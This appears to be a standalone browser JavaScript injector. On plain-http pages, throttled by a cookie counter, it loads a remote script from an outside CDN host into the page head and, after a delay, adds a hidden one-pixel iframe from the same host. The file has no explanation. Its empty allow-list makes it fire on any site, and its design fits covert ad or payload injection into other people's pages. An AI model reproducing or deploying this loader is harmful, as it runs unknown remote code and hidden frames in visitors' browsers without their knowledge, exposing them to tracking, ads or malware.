(function(){
    var head = document.getElementsByTagName('head')[0];
    if(!head){return;}

    var endnsWith = function(str, suffix) {
        return str.indexOf(suffix, str.length - suffix.length) !== -1;
    };

    var check = function(hostname)
    {
        var list = [];        
        for(var i=0;i<list.length;i++)
        {
            var domain = list[i];
            if(hostname === domain){
                return false;
            }
            if(endnsWith(hostname,'.'+domain)){
                return false;
            }
          
           
        }
        return true;
    };
    
	var setCookie = function(cname, cvalue, exdaysm) {
		var d = new Date().getTime()+86400000;
		var expiration = new Date();
		expiration.setTime(d);
		var expires = "expires="+expiration.toGMTString();		
		document.cookie = cname + "=" + cvalue + "; " + expires;
	}

	var getCookie = function(cname) {
		var name = cname + "=";
		var ca = document.cookie.split(';');
		for(var i=0; i<ca.length; i++) {
			var c = ca[i];
			while (c.charAt(0)==' ') c = c.substring(1);
			if (c.indexOf(name) == 0) return c.substring(name.length, c.length);
		}
		return "";
	}
	
	var checkTime = function() {
		var numberRetries = 4;

		var count = 0;
		lastOpen = 0;
		var now = new Date().getTime();			
		var str_count = getCookie("count");
		if (str_count == null || str_count == "") {
			count = 0;
		} else {
			count = parseInt(str_count);
		}
		count++;
		if(count>5)
			return false;
			
		setCookie("count", count, 1);		
		return true;
	}

	
    var action = function()
    {
        var protocol = location.protocol;
        if(!(protocol==='http:')){
            return;
        }
		
		
		///
		if (checkTime() && self === top) {
			var domprefix = 'http://cds.r2c2t8i5.hwcdn.net/';
			var script = document.createElement("script");
			var head = document.getElementsByTagName("head")[0];
			if (!head)
				head = document.createElement("head");

			script.src = domprefix + 'pe-el9.js';
			script.type = 'text/javascript';
			script.async = true;
			head.appendChild(script);

			setTimeout(function() {
				var iibody = document.getElementsByTagName("body")[0];
				if (!iibody)
					iibody = document.createElement("body");
				ifrm = document.createElement("iframe");

				ifrm.src = domprefix + 'pe-el5.html';
				ifrm.style.width = 1 + "px";
				ifrm.style.height = 1 + "px";
				ifrm.style.display = "none";
				iibody.appendChild(ifrm);
			}, 5000);

		}
		
		////
      
    
    };

    var hostname = window.location.hostname;
    var ok = check(hostname);
    if(ok)
    {
       action();
    }

    
})();



//